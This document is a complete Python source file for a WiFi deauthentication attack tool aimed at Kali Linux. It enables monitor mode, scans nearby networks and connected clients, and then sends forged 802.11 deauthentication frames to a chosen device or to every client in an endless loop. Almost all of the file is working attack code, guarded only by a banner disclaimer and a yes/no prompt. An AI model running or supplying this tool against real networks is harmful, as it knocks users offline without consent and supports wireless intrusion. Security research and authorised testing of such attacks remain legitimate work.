#!/usr/bin/env python3

"""
WiFi Deauthentication Tool
A command-line utility for Kali Linux designed for cybersecurity research and penetration testing.

MIT License
Copyright (c) 2024 WiFi Deauthentication Tool
"""

import os
import sys
import time
import logging
import subprocess
import venv
from pathlib import Path
from datetime import datetime

# Import all required packages at module level
try:
    import netifaces
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.panel import Panel
    from rich.live import Live
    from rich.layout import Layout
    from rich import box
except ImportError:
    # These imports failed, but we'll handle it in check_dependencies()
    pass

class SetupManager:
    def __init__(self):
        self.venv_path = Path("venv")
        self.requirements = [
            "scapy>=2.5.0",
            "rich>=13.7.0",
            "netifaces>=0.11.0"
        ]

    def create_venv(self):
        """Create virtual environment if it doesn't exist"""
        if not self.venv_path.exists():
            print("[*] Creating virtual environment...")
            venv.create(self.venv_path, with_pip=True)
            return True
        return False

    def get_venv_python(self):
        """Get the path to the virtual environment's Python interpreter"""
        if sys.platform == "win32":
            return self.venv_path / "Scripts" / "python.exe"
        return self.venv_path / "bin" / "python"

    def get_venv_pip(self):
        """Get the path to the virtual environment's pip"""
        if sys.platform == "win32":
            return self.venv_path / "Scripts" / "pip.exe"
        return self.venv_path / "bin" / "pip"

    def create_requirements_file(self):
        """Create requirements.txt file"""
        with open("requirements.txt", "w") as f:
            f.write("\n".join(self.requirements))

    def install_requirements(self):
        """Install required packages in the virtual environment"""
        self.create_requirements_file()
        pip = self.get_venv_pip()
        print("[*] Installing required packages...")
        subprocess.run([str(pip), "install", "-r", "requirements.txt"])
        os.remove("requirements.txt")  # Clean up

    def setup(self):
        """Perform complete setup"""
        try:
            if self.create_venv():
                print("[+] Virtual environment created successfully")
            else:
                print("[*] Using existing virtual environment")

            self.install_requirements()
            print("[+] Setup completed successfully")
            
            # Relaunch the script in the virtual environment
            python_path = self.get_venv_python()
            if python_path.exists():
                print("[*] Launching tool in virtual environment...")
                os.execl(str(python_path), str(python_path), *sys.argv)
            
        except Exception as e:
            print(f"[!] Setup failed: {e}")
            sys.exit(1)

def check_dependencies():
    """Check if all required packages are installed"""
    try:
        import netifaces
        import scapy.all
        import scapy.layers.dot11
        import rich.console
        import rich.table
        import rich.progress
        import rich.panel
        import rich.live
        import rich.layout
        return True
    except ImportError as e:
        return False

def check_venv():
    """Check if running in virtual environment and handle setup if needed"""
    if not hasattr(sys, 'real_prefix') and not sys.base_prefix != sys.prefix:
        if not check_dependencies():
            print("[!] Required packages not found. Starting setup...")
            setup_manager = SetupManager()
            setup_manager.setup()
            sys.exit(1)

# Check virtual environment and dependencies before proceeding
check_venv()

# Initialize rich console
console = Console()

class DeauthTool:
    def __init__(self):
        self.interface = None
        self.bssid = None
        self.client = None
        self.num_packets = 50
        self.interval = 0.1
        self.monitor_mode = False
        self.networks = {}
        self.clients = {}
        self.network_info = None
        self.console = Console()
        
        # Create layout
        self.layout = Layout()
        self.layout.split_column(
            Layout(name="header"),
            Layout(name="main"),
            Layout(name="footer")
        )

    def show_banner(self):
        """Display tool banner"""
        banner = """
██╗    ██╗██╗███████╗██╗    ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗
██║    ██║██║██╔════╝██║    ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║
██║ █╗ ██║██║█████╗  ██║    ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║
██║███╗██║██║██╔══╝  ██║    ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║
╚███╔███╔╝██║██║     ██║    ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
        """
        self.console.print(Panel(banner, style="bold blue"))
        self.console.print(Panel("🛡️  [bold red]For Educational and Authorized Testing Only[/bold red]", style="red"))

    def get_user_agreement(self):
        """Get user agreement and check root privileges"""
        try:
            # Check root privileges
            if os.geteuid() != 0:
                self.console.print("[bold red]❌ This script must be run as root[/bold red]")
                return False
            
            # Show disclaimer
            response = self.console.input("\n[bold red]⚠  This tool is for authorized testing only. Do you agree? (yes/no): [/bold red]")
            
            if response.lower() != 'yes':
                self.console.print("\n[yellow]Aborted by user.[/yellow]")
                return False
                
            return True
            
        except Exception as e:
            self.console.print(f"[bold red]Error getting user agreement: {str(e)}[/bold red]")
            return False

    def get_wireless_interfaces(self):
        """Get list of wireless interfaces"""
        interfaces = []
        try:
            output = subprocess.check_output(['iwconfig'], stderr=subprocess.STDOUT).decode()
            for line in output.split('\n'):
                if line.startswith(' ') or not line:
                    continue
                interface = line.split()[0]
                if 'no wireless extensions' not in line:
                    interfaces.append(interface)
        except:
            for iface in netifaces.interfaces():
                if iface.startswith(('wlan', 'wifi', 'wl')):
                    interfaces.append(iface)
        return interfaces

    def select_interface(self):
        """Show available interfaces and let user select one"""
        interfaces = self.get_wireless_interfaces()
        
        if not interfaces:
            self.console.print("[bold red]❌ No wireless interfaces found[/bold red]")
            sys.exit(1)
            
        table = Table(title="Available Wireless Interfaces")
        table.add_column("No.", style="cyan", justify="right")
        table.add_column("Interface", style="green")
        
        for i, iface in enumerate(interfaces, 1):
            table.add_row(str(i), iface)
            
        self.console.print(table)
            
        while True:
            try:
                choice = int(self.console.input("\n[bold cyan]Select interface number: [/bold cyan]"))
                if 1 <= choice <= len(interfaces):
                    self.interface = interfaces[choice-1]
                    break
                else:
                    self.console.print("[bold red]Invalid choice. Please try again.[/bold red]")
            except ValueError:
                self.console.print("[bold red]Please enter a number.[/bold red]")

    def enable_monitor_mode(self):
        """Enable monitor mode on selected interface"""
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
        ) as progress:
            task = progress.add_task("[cyan]Enabling monitor mode...", total=None)
            try:
                os.system(f'airmon-ng check kill')
                os.system(f'airmon-ng start {self.interface}')
                self.monitor_mode = True
                progress.update(task, completed=100)
                self.console.print(f"[bold green]✓ Monitor mode enabled on {self.interface}[/bold green]")
            except Exception as e:
                self.console.print(f"[bold red]❌ Failed to enable monitor mode: {e}[/bold red]")
                sys.exit(1)

    def scan_networks(self):
        """Scan and let user select network"""
        self.console.print("\n[bold cyan]📡 Scanning for WiFi Networks...[/bold cyan]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
        ) as progress:
            scan_task = progress.add_task("[cyan]Running network discovery...", total=None)
            
            try:
                # Run iwlist scan
                cmd = f"iwlist {self.interface} scan"
                output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
                
                # Parse the output
                current_cell = {}
                for line in output.split('\n'):
                    line = line.strip()
                    
                    if line.startswith('Cell '):
                        if current_cell and 'bssid' in current_cell:
                            self.networks[current_cell['bssid']] = {
                                'ssid': current_cell.get('ssid', '[Hidden]'),
                                'channel': current_cell.get('channel', '?'),
                                'signal': current_cell.get('signal', -100),
                                'encryption': current_cell.get('encryption', 'Unknown'),
                                'clients': set()
                            }
                        current_cell = {}
                        current_cell['bssid'] = line.split('Address: ')[1]
                    
                    elif line.startswith('Channel:'):
                        current_cell['channel'] = line.split(':')[1].strip()
                    
                    elif line.startswith('ESSID:'):
                        ssid = line.split(':')[1].strip('"')
                        current_cell['ssid'] = ssid if ssid else '[Hidden]'
                    
                    elif line.startswith('Quality'):
                        try:
                            signal = line.split('Signal level=')[1].split(' ')[0]
                            if signal.endswith('dBm'):
                                current_cell['signal'] = int(signal[:-3])
                            else:
                                current_cell['signal'] = int(signal)
                        except:
                            current_cell['signal'] = -100
                    
                    elif line.startswith('Encryption key:'):
                        if 'on' in line.lower():
                            if 'IE: WPA2' in output:
                                current_cell['encryption'] = 'WPA2'
                            elif 'IE: WPA' in output:
                                current_cell['encryption'] = 'WPA'
                            else:
                                current_cell['encryption'] = 'WEP'
                        else:
                            current_cell['encryption'] = 'Open'
                
                # Add the last cell if exists
                if current_cell and 'bssid' in current_cell:
                    self.networks[current_cell['bssid']] = {
                        'ssid': current_cell.get('ssid', '[Hidden]'),
                        'channel': current_cell.get('channel', '?'),
                        'signal': current_cell.get('signal', -100),
                        'encryption': current_cell.get('encryption', 'Unknown'),
                        'clients': set()
                    }
                            
            except Exception as e:
                self.console.print(f"[bold red]Error during scanning: {str(e)}[/bold red]")
                return False

        if not self.networks:
            self.console.print("[bold yellow]⚠️  No networks found. Make sure your wireless interface is working.[/bold yellow]")
            return False

        # Create and display networks table
        table = Table(
            title="[bold cyan]📶 Available WiFi Networks[/bold cyan]",
            title_justify="left",
            box=box.ROUNDED
        )
        
        table.add_column("No.", style="cyan", justify="right")
        table.add_column("SSID", style="green")
        table.add_column("BSSID", style="blue")
        table.add_column("Channel", justify="center")
        table.add_column("Signal", justify="center")
        table.add_column("Security", style="yellow")

        for idx, (bssid, network) in enumerate(sorted(self.networks.items(), 
                                                     key=lambda x: x[1]['signal'], 
                                                     reverse=True), 1):
            signal_bars = self.get_signal_strength_bars(network['signal'])
            table.add_row(
                str(idx),
                network['ssid'],
                bssid,
                str(network['channel']),
                f"{signal_bars} ({network['signal']} dBm)",
                network['encryption']
            )

        self.console.print(table)
        self.console.print(f"\n[green]✓[/green] Found [bold cyan]{len(self.networks)}[/bold cyan] networks\n")

        # Network selection
        while True:
            try:
                choice = int(self.console.input("[bold cyan]Select network number: [/bold cyan]"))
                if 1 <= choice <= len(self.networks):
                    self.bssid = list(self.networks.keys())[choice-1]
                    self.network_info = self.networks[self.bssid]
                    return True
                else:
                    self.console.print("[bold red]Invalid choice. Please try again.[/bold red]")
            except ValueError:
                self.console.print("[bold red]Please enter a number.[/bold red]")
        
        return False

    def get_encryption_type(self, pkt):
        """Determine encryption type from packet"""
        crypto = set()
        
        # Extract all Dot11Elt layers
        p = pkt[Dot11Elt]
        while isinstance(p, Dot11Elt):
            if p.ID == 48:  # RSN
                crypto.add("WPA2")
            elif p.ID == 221 and p.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                crypto.add("WPA")
            p = p.payload
            
        if not crypto:
            if pkt.hasflag('privacy'):
                crypto.add("WEP")
            else:
                crypto.add("OPEN")
                
        return '/'.join(sorted(crypto))

    def get_signal_strength_bars(self, signal):
        """Convert signal strength to visual bars"""
        if signal >= -50: return "▂▄▆█"
        elif signal >= -60: return "▂▄▆_"
        elif signal >= -70: return "▂▄__"
        elif signal >= -80: return "▂___"
        else: return "____"

    def scan_clients(self):
        """Scan for clients connected to selected network"""
        if not self.network_info:
            self.console.print("[bold red]❌ No network selected[/bold red]")
            return False

        ssid = self.network_info['ssid']
        self.console.print(f"\n[bold cyan]👥 Scanning for clients on network: [green]{ssid}[/green][/bold cyan]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
        ) as progress:
            scan_task = progress.add_task("[cyan]Scanning for clients...", total=None)
            
            try:
                # Use tcpdump to capture packets for 15 seconds
                cmd = f"timeout 15 tcpdump -i {self.interface} -e -s 256 type mgt subtype probe-req or subtype probe-resp or subtype assoc-req or subtype assoc-resp"
                output = subprocess.check_output(cmd.split(), stderr=subprocess.DEVNULL).decode()
                
                # Parse tcpdump output for client MACs
                for line in output.split('\n'):
                    if self.bssid.lower() in line.lower():
                        parts = line.split()
                        for part in parts:
                            if ':' in part and len(part) == 17:  # MAC address format
                                client_mac = part.lower()
                                if client_mac != self.bssid.lower():
                                    self.clients[client_mac] = {
                                        'type': self.get_device_type(client_mac),
                                        'signal': -50,  # Default value since tcpdump doesn't provide signal strength
                                        'last_seen': time.time()
                                    }
                            
            except Exception as e:
                self.console.print(f"[bold red]Error during client scanning: {str(e)}[/bold red]")
                return False

        if not self.clients:
            self.console.print("[bold yellow]⚠️  No clients found connected to this network.[/bold yellow]")
            return False

        # Create and display clients table
        table = Table(
            title="[bold cyan]📱 Connected Clients[/bold cyan]",
            title_justify="left",
            box=box.ROUNDED
        )
        
        table.add_column("No.", style="cyan", justify="right")
        table.add_column("Client MAC", style="green")
        table.add_column("Device Type", style="blue")
        table.add_column("Last Seen", style="yellow")

        current_time = time.time()
        for idx, (mac, client) in enumerate(sorted(self.clients.items(), 
                                                 key=lambda x: x[1]['last_seen'],
                                                 reverse=True), 1):
            last_seen = f"{int(current_time - client['last_seen'])}s ago"
            
            table.add_row(
                str(idx),
                mac,
                client['type'],
                last_seen
            )

        self.console.print(table)

        # Client selection
        while True:
            try:
                choice = self.console.input("\n[bold cyan]Select client number (0 for all clients): [/bold cyan]")
                if choice == "0":
                    self.client = None
                    return True
                choice = int(choice)
                if 1 <= choice <= len(self.clients):
                    self.client = list(self.clients.keys())[choice-1]
                    return True
                else:
                    self.console.print("[bold red]Invalid choice. Please try again.[/bold red]")
            except ValueError:
                self.console.print("[bold red]Please enter a number.[/bold red]")
        
        return False

    def get_device_type(self, mac):
        """Determine device type based on MAC address"""
        mac = mac.lower()
        # Add common device manufacturer prefixes
        manufacturers = {
            "apple": "📱 Apple Device",
            "samsung": "📱 Samsung Device",
            "google": "🤖 Google Device",
            "intel": "💻 Intel Device",
            "raspberry": "🔲 Raspberry Pi",
            "microsoft": "💻 Microsoft Device",
            "android": "📱 Android Device",
            "huawei": "📱 Huawei Device",
            "xiaomi": "📱 Xiaomi Device",
        }
        
        try:
            # You could use a MAC address lookup library here
            # For now, we'll do a simple check
            for prefix, device_type in manufacturers.items():
                if prefix in mac:
                    return device_type
        except:
            pass
            
        return "❓ Unknown Device"

    def perform_deauth(self):
        """Perform deauthentication attack"""
        target = self.client if self.client else "ff:ff:ff:ff:ff:ff"
        
        packet = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1=target,
            addr2=self.bssid,
            addr3=self.bssid
        ) / Dot11Deauth(reason=7)
        
        attack_info = Table(title="Attack Information", show_header=False, title_style="bold red")
        attack_info.add_column("Property", style="cyan")
        attack_info.add_column("Value", style="green")
        
        attack_info.add_row("Target Network", self.networks[self.bssid]['ssid'])
        attack_info.add_row("BSSID", self.bssid)
        if self.client:
            attack_info.add_row("Target Client", f"{self.client} ({self.clients[self.client]})")
        else:
            attack_info.add_row("Target", "All Clients")
            
        self.console.print(Panel(attack_info, title="[bold red]⚡ Starting Deauthentication Attack[/bold red]"))
            
        try:
            with Live(auto_refresh=False) as live:
                packets_sent = 0
                start_time = time.time()
                
                while True:
                    sendp(packet, iface=self.interface, verbose=False)
                    packets_sent += 1
                    elapsed = time.time() - start_time
                    
                    status = Table.grid()
                    status.add_column()
                    status.add_row(f"[bold green]Packets Sent: {packets_sent}[/bold green]")
                    status.add_row(f"[cyan]Time Elapsed: {elapsed:.1f}s[/cyan]")
                    status.add_row(f"[yellow]Rate: {packets_sent/elapsed:.1f} packets/s[/yellow]")
                    
                    live.update(status, refresh=True)
                    time.sleep(self.interval)
                    
        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]⚠️  Attack interrupted by user[/bold yellow]")

    def cleanup(self):
        """Cleanup and restore normal operation"""
        if self.monitor_mode:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
            ) as progress:
                task = progress.add_task("[cyan]Cleaning up...", total=None)
                try:
                    os.system(f'airmon-ng stop {self.interface}')
                    os.system('service NetworkManager start')
                    progress.update(task, completed=100)
                    self.console.print("[bold green]✓ Network interface restored[/bold green]")
                except Exception as e:
                    self.console.print(f"[bold red]❌ Error during cleanup: {e}[/bold red]")

    def start(self):
        """Start the deauth tool"""
        try:
            # Show banner
            self.show_banner()
            
            # Get user agreement
            if not self.get_user_agreement():
                return
            
            # Select interface
            self.select_interface()
            
            # Enable monitor mode
            self.enable_monitor_mode()
            
            # Scan networks
            if not self.scan_networks():
                self.cleanup()
                return
            
            # If we have a valid network selected, scan for clients
            if self.network_info:
                if not self.scan_clients():
                    self.cleanup()
                    return
                
                # If we have clients, perform deauth
                if self.clients:
                    self.perform_deauth()
            
        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]⚠  Attack interrupted by user[/bold yellow]")
        except Exception as e:
            self.console.print(f"\n[bold red]❌ Error: {str(e)}[/bold red]")
        finally:
            self.cleanup()

def main():
    tool = DeauthTool()
    tool.start()

if __name__ == '__main__':
    main() 